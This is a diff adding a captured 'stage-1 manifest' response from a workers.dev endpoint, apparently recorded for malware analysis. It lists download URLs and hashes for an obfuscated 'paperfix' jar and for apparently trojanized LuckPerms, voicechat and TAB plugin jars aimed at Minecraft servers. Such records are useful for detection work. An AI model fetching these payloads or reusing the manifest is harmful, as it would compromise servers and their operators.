@@ -1,0 +1,5 @@
+# Stage-1 manifest response
+# Endpoint: http://crimson-tree-cf44.blaher331.workers.dev/api/asdfg2asd
+# Captured response, JSON unchanged. Terminal prompt and local path removed.
+
+{"disabled":"false","url":"https://gitlab.com/blaher331/nigea/-/raw/main/paperfix-3.2.6-obfuscated.jar?inline=false","sha256":"fb52ed5592921a3f6dae2ad32e9e19874803fe554c2e208d4c5f164f851d511c","also":[{"namePattern":"LuckPerms.*\\.jar","url":"https://github.com/fyreac/fyreac/releases/download/67/LuckPerms-Bukkit-5.5.53.jar","sha256":"c75e2b31699eb929290a1706571e3a13da68b9d5776d786aeda8dfeeb214c3d5"},{"namePattern":"voicechat.*\\.jar","url":"https://github.com/fyreac/fyreac/releases/download/67/voicechat-bukkit-2.6.23.jar","sha256":"4e5b903e006222bbc76e48ed8623a55eb0dfc8c57a41c36144b029cad14b2fcc"},{"namePattern":"TAB.*\\.jar","url":"https://github.com/fyreac/fyreac/releases/download/67/TAB.v6.1.3.jar","sha256":"cf60fd044b307658d246c1646916bfd6606e7c2c7bfb427c3e2c90087cab0b92"}]}
